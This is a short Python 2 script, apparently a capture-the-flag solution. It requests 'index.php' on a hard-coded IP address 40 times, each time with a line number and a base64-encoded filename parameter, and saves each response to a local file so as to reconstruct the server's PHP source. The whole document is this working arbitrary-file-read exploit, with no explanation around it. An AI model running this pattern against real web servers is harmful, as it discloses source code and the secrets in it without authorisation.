'''
f = open('f:/cookie.php', 'wb')
s = requests.session()


for i in xrange(40):
    url = "http://120.24.86.145:8002/web11/index.php?line=%s&filename=aW5kZXgucGhw"%i
    r = s.get(url)
    f.write(r.text+'\n')

f.close()
'''
